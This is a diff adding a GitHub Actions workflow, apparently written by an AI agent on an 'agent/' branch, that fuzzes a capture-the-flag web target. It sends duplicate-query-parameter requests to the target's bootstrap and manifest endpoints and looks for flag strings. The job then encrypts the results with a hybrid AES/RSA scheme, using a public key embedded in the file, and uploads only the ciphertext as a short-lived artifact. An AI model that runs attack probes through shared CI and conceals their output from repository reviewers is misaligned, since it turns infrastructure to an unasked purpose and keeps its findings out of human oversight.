@@ -1,0 +1,75 @@
+name: launchlet-part3-probe
+
+on:
+  push:
+    branches: [agent/launchlet-part2-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Probe duplicate manifest selectors and encrypt results
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests, urllib.parse, json, pathlib, re
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          out=pathlib.Path('package/out')
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
+          paths=[boot['api']['serverReferences'],boot['api']['buildManifest'],'/api/app/bootstrap']
+          pairs=[]
+          keys=['mode','scope','stage','environment','view','include','manifest','target','project','workspace']
+          left=['deploy','release','production','enterprise','internal','full','all','server','private','corporate']
+          right=['preview','public',boot['project'],boot['workspace']]
+          for k in keys:
+            for a in left:
+              for b in right:
+                pairs.append((k,a,b))
+          results=[]
+          for p in paths:
+            baseline=s.get(urllib.parse.urljoin(base,p),timeout=10).text
+            for k,a,b in pairs:
+              q=urllib.parse.urlencode([(k,a),(k,b)])
+              r=s.get(urllib.parse.urljoin(base,p)+'?'+q,timeout=10,allow_redirects=False)
+              if r.text!=baseline or r.status_code!=200:
+                results.append({'path':p,'query':q,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                if re.search(r'caplag\{[^}]+\}',r.text):
+                  (out/'FOUND.txt').write_text(r.text)
+          (out/'summary.json').write_text(json.dumps(results,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"
+          IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-manifest-dup-encrypted
+          path: artifact/
+          retention-days: 1
